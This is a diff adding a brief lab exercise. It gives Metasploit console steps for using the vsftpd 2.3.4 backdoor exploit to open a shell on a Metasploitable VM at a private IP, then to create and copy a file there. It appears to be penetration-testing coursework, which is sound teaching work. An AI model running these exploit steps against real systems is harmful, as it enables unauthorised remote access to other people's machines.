@@ -1,0 +1,10 @@
+Open Kali Linux terminal, type following cmds
+# 𝑚𝑠𝑓𝑢𝑝𝑑𝑎𝑡𝑒 —"Use this if metaspoilt-framework is more than two weeks old. Run msfupdate to get
+latest framework”
+➢ 𝑚𝑠𝑓𝑐𝑜𝑛𝑠𝑜𝑙𝑒
+➢ 𝑢𝑠𝑒 𝑒𝑥𝑝𝑙𝑜𝑖𝑡/𝑢𝑛𝑖𝑥/𝑓𝑡𝑝/𝑣𝑠𝑓𝑡𝑝𝑑_234_𝑏𝑎𝑐𝑘𝑑𝑜𝑜𝑟
+➢ 𝑠ℎ𝑜𝑤 𝑜𝑝𝑡𝑖𝑜𝑛𝑠
+➢ 𝑠𝑒𝑡 𝑅𝐻𝑂𝑆𝑇 192. 168. 62. 129
+➢ 𝑒𝑥𝑝𝑙𝑜𝑖𝑡
+➢ It will open the shell of target IP (metaspoiltable vm)
+➢Create a file say 𝑠𝑎𝑚𝑝𝑙𝑒. 𝑡𝑥𝑡 with some contents, copy the file to another new file.
